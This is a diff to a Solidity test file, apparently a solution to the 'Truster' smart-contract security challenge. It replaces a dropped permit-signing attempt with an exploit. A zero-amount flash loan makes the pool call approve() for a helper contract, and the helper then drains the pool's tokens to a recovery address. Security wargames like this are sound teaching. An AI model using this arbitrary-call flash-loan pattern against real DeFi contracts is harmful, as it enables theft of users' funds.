@@ -53,8 +53,13 @@ contract TrusterChallenge is Test {
      */
     function test_truster() public checkSolvedByPlayer {
         ExploitHelper exploitHelper = new ExploitHelper(address(token));
-        bytes32 digest = exploitHelper.getPermitDigest(address(pool), address(exploitHelper), TOKENS_IN_POOL, 0, block.timestamp + 1 hours);
-        // fok i haven't thought of it, i can"t just sign it like i wanted because the setup doesn't provide the secret key of player, i don't know if that is intended (since i'm the player i should be able to get it?)  :/
+        bytes memory payload = abi.encodeWithSignature(
+            "approve(address,uint256)",
+            address(exploitHelper),
+            TOKENS_IN_POOL
+        );
+        exploitHelper.doFlashLoan(address(pool), 0, address(player), address(token), payload);
+        exploitHelper.useBackdoor(address(pool), address(recovery), TOKENS_IN_POOL);
     }
 
     // // fuzzing
